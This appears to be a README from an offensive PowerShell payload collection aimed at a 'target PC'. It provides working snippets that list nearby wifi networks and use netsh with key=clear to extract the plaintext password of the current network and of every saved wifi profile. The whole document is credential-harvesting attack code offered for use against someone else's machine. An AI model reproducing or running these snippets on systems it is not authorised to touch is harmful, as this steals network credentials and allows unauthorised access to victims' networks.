## Description

These functions will help you enumerate your targets wifi, and the wifi nearby

## The Function

### [Nearby Networks] 

This quick snippet will get you the wifi connections visible from your targets PC 

```PowerShell
$NearbyNetworks = (netsh wlan show networks mode=Bssid | ?{$_ -like "SSID*" -or $_ -like "*Authentication*" -or $_ -like "*Encryption*"}).trim()
```

### [Get-CurrentNetwork] 

This first function will get you the SSID and Password the target PC is currently connected to and save it to the variable $CurrentNetwork

```PowerShell
function Get-CurrentNetwork {

$pro = netsh wlan show interface | Select-String -Pattern ' SSID '; $pro = [string]$pro;$pos = $pro.IndexOf(':');$pro = $pro.Substring($pos+2).Trim()

$pass = netsh wlan show profile $pro key=clear | Select-String -Pattern 'Key Content'; $pass = [string]$pass;$passPOS = $pass.IndexOf(':');$pass = $pass.Substring($passPOS+2).Trim()

return "$pro	:	$pass"

} 

$CurrentNetwork = Get-CurrentNetwork

```

### [Get-AllNetworks] 

This function will get you a list of all the wifi networks your target has joined and their passwords and save it to the variable $Networks

```PowerShell
Function Get-Networks {
# Get Network Interfaces
$Network = Get-WmiObject Win32_NetworkAdapterConfiguration | where { $_.MACAddress -notlike $null }  | select Index, Description, IPAddress, DefaultIPGateway, MACAddress | Format-Table Index, Description, IPAddress, DefaultIPGateway, MACAddress 

# Get Wifi SSIDs and Passwords	
$WLANProfileNames =@()

#Get all the WLAN profile names
$Output = netsh.exe wlan show profiles | Select-String -pattern " : "

#Trim the output to receive only the name
Foreach($WLANProfileName in $Output){
    $WLANProfileNames += (($WLANProfileName -split ":")[1]).Trim()
}
$WLANProfileObjects =@()

#Bind the WLAN profile names and also the password to a custom object
Foreach($WLANProfileName in $WLANProfileNames){

    #get the output for the specified profile name and trim the output to receive the password if there is no password it will inform the user
    try{
        $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Key Content") -split ":")[1]).Trim()
    }Catch{
        $WLANProfilePassword = "The password is not stored in this profile"
    }

    #Build the object and add this to an array
    $WLANProfileObject = New-Object PSCustomobject 
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfileName" -Value $WLANProfileName
    $WLANProfileObject | Add-Member -Type NoteProperty -Name "ProfilePassword" -Value $WLANProfilePassword
    $WLANProfileObjects += $WLANProfileObject
    Remove-Variable WLANProfileObject    
}
return $WLANProfileObjects
}

$Networks = Get-Networks
```